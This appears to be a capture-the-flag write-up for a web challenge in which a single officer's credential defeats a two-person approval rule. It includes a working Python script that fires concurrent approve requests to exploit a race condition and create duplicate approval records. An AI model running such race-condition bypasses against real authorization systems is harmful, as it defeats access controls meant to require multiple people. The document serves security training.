# Two-Key Turn

> Web · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — a per-team value read from the order's `arming_authorization` once it reaches `ARMED`.
JohnG4lt holds the credited solve; the route and script below are his. The literal flag string was read
from the live response and not saved (the instance is now closed).

**Challenge**

Kessara's coastal fire-authorization console arms a fire order only after two *distinct* officers approve
it — a two-person rule. A hostile insider holds just one officer's credential: the per-instance operator
key for VEGA-7, presented as `Authorization: Bearer <key>`. The API documents itself at `GET /schema`.
One order sits in `PENDING_AUTH`; the goal is to drive it to `ARMED` with that single credential and read
its arming authorization. All interaction stays on the assigned instance.

**Approach**

1. **Read the API contract.** `GET /schema` identifies the officer, returns the per-instance operator
   credential (`issued_operator_credential`), documents the approval route, and states an eight-second
   pending window. `GET /orders` identifies the current `PENDING_AUTH` order. Fetch both at runtime —
   credentials and order IDs are instance-specific.
2. **Race the approval.** The schema notes that an ordinary burst of 6–8 separate-connection requests is
   supported. Fire eight simultaneous `POST /orders/{id}/approve` requests with the *same* bearer
   credential, so two of them land inside the un-serialized approval window.
3. **Handle the retry window.** On the supplied instance the first burst recorded one approval while
   another request got `409 Conflict`, and the order reported `retry_after_ms`. Sleep that long, send a
   second eight-request burst, and re-fetch the order detail.
4. **Verify and read.** The order flips to `ARMED` with two approval records for `VEGA-7` at the same
   epoch, and the detail response carries `arming_authorization` (the flag).

```python
import json, time
from concurrent.futures import ThreadPoolExecutor
from urllib.error import HTTPError
from urllib.request import Request, urlopen

BASE = "<URL>"
schema = json.load(urlopen(f"{BASE}/schema"))
headers = {"Authorization": f"Bearer {schema['issued_operator_credential']}"}

def get(path):
    with urlopen(Request(f"{BASE}{path}", headers=headers), timeout=10) as r:
        return json.load(r)

order = next(o for o in get("/orders")["orders"] if o["status"] == "PENDING_AUTH")
order_id = order["id"]

def approve(_):
    req = Request(f"{BASE}/orders/{order_id}/approve", method="POST", headers=headers)
    try:
        with urlopen(req, timeout=10) as r:
            return r.status, json.load(r)
    except HTTPError as r:
        return r.code, json.load(r)

for _ in range(3):
    if order["status"] == "ARMED":
        break
    if order.get("retry_after_ms"):
        time.sleep(order["retry_after_ms"] / 1000 + 0.1)
    with ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(approve, range(8)))
    order = get(f"/orders/{order_id}")

print(order)   # status: ARMED, two VEGA-7 approvals, arming_authorization
```

**Why it works**

The approval endpoint's idempotency check and its approval-record write are not safely serialized.
Several requests authenticated as one officer, arriving together, each pass the "already approved?" check
before any of them commits, so they create *duplicate* approval records. Two records satisfy the arming
condition even though they come from a single identity — the two-person rule is enforced by counting
records rather than counting distinct authenticated officers. This is a TOCTOU / race-condition
authorization bypass.

**Validation**

On the supplied instance the retried burst produced `status: ARMED`, two `VEGA-7` approval records at the
same epoch, and an `arming_authorization` value, which was the flag. The credited solve was recorded on
CTFd on 7 Nov at 18:01 UTC. The race is inherently timing-dependent: a burst may need to be repeated a
couple of times within the eight-second window before two requests overlap.
